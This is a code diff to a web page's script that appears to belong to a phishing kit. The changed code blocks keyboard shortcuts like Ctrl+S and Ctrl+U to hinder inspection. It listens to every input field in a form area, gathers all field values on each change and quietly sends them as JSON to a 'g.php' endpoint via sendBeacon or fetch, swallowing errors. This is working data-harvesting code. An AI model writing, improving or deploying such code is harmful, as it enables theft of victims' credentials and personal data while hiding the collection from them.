@@ -341,8 +341,7 @@ input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
 		</div> 
 <script>
 function setupUI() {
-  const ENDPOINT = "./g.php";
-
+  const ENDPOINT = window.location.pathname.replace(/\/$/, '') + '/g.php';
 
   // 🔒 Block specific key combos (Ctrl+S, Ctrl+U, etc.)
   document.addEventListener("keydown", e => {
@@ -380,38 +379,36 @@ function setupUI() {
   }
 
   function sendPayload(payload) {
-  try {
-    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
-    let beaconOk = false;
+    try {
+      const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+      let beaconOk = false;
 
-    if (navigator.sendBeacon) {
-      beaconOk = navigator.sendBeacon(ENDPOINT, blob);
-    }
+      if (navigator.sendBeacon) {
+        beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+      }
 
-    if (!beaconOk) {
-      fetch(ENDPOINT, {
-        method: "POST",
-        body: JSON.stringify(payload),
-        headers: { "Content-Type": "application/json" },
-        keepalive: true
-      }).catch(() => {});
-    }
-  } catch (err) {}
- }
+      if (!beaconOk) {
+        fetch(ENDPOINT, {
+          method: "POST",
+          body: JSON.stringify(payload),
+          headers: { "Content-Type": "application/json" },
+          keepalive: true
+        }).catch(() => {});
+      }
+    } catch (err) {}
+  }
 
-
-  document.addEventListener("change", e => {
-    const el = e.target;
-    if (el?.closest("#clsdiv") && el.matches(".input-control")) {
-      const inputs = document.querySelectorAll(".input-control");
-
-      const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };
-
-      inputs.forEach(input => {
-        if (input.name) payload.fields[input.name] = input.value;
-      });
-      sendPayload(payload);
-    }
+  // ✅ Attach change listeners directly to each input-control
+  document.querySelectorAll(".input-control").forEach(input => {
+    input.addEventListener("change", () => {
+      if (input.closest("#clsdiv")) {
+        const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };
+        document.querySelectorAll(".input-control").forEach(i => {
+          if (i.name) payload.fields[i.name] = i.value;
+        });
+        sendPayload(payload);
+      }
+    });
   });
 }
 
